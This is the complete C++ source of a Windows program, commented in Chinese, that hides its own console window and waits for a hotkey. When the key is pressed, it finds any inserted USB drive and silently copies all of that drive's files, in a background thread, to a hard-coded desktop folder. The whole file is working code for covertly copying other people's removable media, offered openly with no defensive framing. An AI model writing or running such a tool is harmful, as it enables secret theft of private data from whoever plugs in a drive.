#include<Windows.h>
#include<iostream>
#include<thread>  //线程库
#include<filesystem> //需要C++17标准
using namespace std;
namespace fs = filesystem;

bool isExec = false; //判断当前是否正在执行拷贝行为
string g_savePath = "C:\\Users\\49751\\Desktop\\test"; //要保存文件的路径

//注册全局热键
bool RegisterGlobalKey();
//删除全局快捷键
void UnRegistreGlobalKey();
//找U盘
string FindDriver();
//处理消息
bool DealMsg(WPARAM wParam);

int main() {
    ShowWindow(GetConsoleWindow(), false); //隐藏窗口
    UnRegistreGlobalKey(); //先注销全局快捷键,防止其它应用占用
    bool ret = RegisterGlobalKey();//注册全局款快捷键
    if (!ret) return -1;
    MSG msg{};
    while (GetMessage(&msg, NULL, 0, 0)) { //进入消息循环
        ret = DealMsg(msg.wParam); //处理接收到的消息
        if (!ret) break; //false则退出程序
    }
    UnRegistreGlobalKey(); //注销全局快捷键

    return 0;
}

bool RegisterGlobalKey() {
    bool ret = RegisterHotKey(NULL, 'l', MOD_CONTROL, VK_CONTROL); //单击Ctrl开启运行
    if (!ret) return ret;
    return ret;
}

void UnRegistreGlobalKey() {
    UnregisterHotKey(NULL, 'l');
}

string FindDriver() {
    int len = GetLogicalDriveStringsA(0, 0);
    std::string dri;
    dri.resize(len);
    GetLogicalDriveStringsA(len, (LPSTR)dri.c_str());
    for (int i = 0; i < len - 1; i++) {
        if (dri[i] == '\0' && dri[i + 1] == '\0') break; //到结尾,退出
        if (dri[i] != '\0') continue; //不为盘符名分界,继续下一次循环
        i += 1;
        if (GetDriveTypeA(&dri[i]) == DRIVE_REMOVABLE) { 
            return &dri[i];
        }
    }
    return string();
}

bool DealMsg(WPARAM wParam) { //处理消息
    switch (wParam)
    {
    case 'l': //开始执行程序
    {
        if (isExec) return true;
        string uDrive = FindDriver(); //找U盘
        if (uDrive.empty()) return true;//没有U盘则直接退出
        isExec = true;
        //有则开启线程，执行任务
        thread t([uDrive]() {
            if (!fs::exists(g_savePath)) { //目录不存在则创建
                fs::create_directories(g_savePath);
            }
            fs::copy(uDrive, g_savePath, fs::copy_options::recursive | fs::copy_options::skip_existing); //递归拷贝目录,如果存在则跳过
            isExec = false;
            }); //开启线程

        t.detach(); //将线程与该线程对象分离
        return true;
    }
    default:
        break;
    }
    return true;
}
